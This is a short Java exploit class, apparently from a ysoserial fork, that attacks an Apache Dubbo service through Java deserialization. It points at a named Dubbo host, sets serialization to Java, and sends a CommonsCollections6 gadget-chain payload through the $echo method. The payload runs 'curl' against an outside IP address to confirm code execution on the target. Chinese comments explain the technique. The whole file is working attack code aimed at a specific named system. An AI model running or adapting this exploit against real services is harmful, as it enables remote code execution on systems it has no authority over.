package ysoserial.exploit.dubbo;

import com.alibaba.dubbo.config.ApplicationConfig;
import com.alibaba.dubbo.config.ReferenceConfig;
import com.alibaba.dubbo.rpc.service.EchoService;

public class DubboExp {

    public static void main(String[] args) throws Exception {
        ReferenceConfig<EchoService> reference = new ReferenceConfig<EchoService>();
        //dubbo的url 指定协议为hessian2 其实就算url写错了只要serialization写对了也可以执行
        reference.setUrl("dubbo://manage.vpnaccounttest.qd.alibaba.com:20880/com.ccservice.dubbo_interface.Lcxxcx?serialization=java");
        ApplicationConfig application = new ApplicationConfig();
        application.setName("whatever");//随便写
        reference.setTimeout(20000);//超时20s
        reference.setApplication(application);
        reference.setInterface(EchoService.class);//设置引用
        EchoService e = reference.get();
        //用默认全部都实现的$echo方法发送恶意对象
        e.$echo(new ysoserial.payloads.CommonsCollections6().getObject("curl 123.57.67.192/xt.test"));
        //System.out.println(e.$echo("xxxxx"));
    }

}
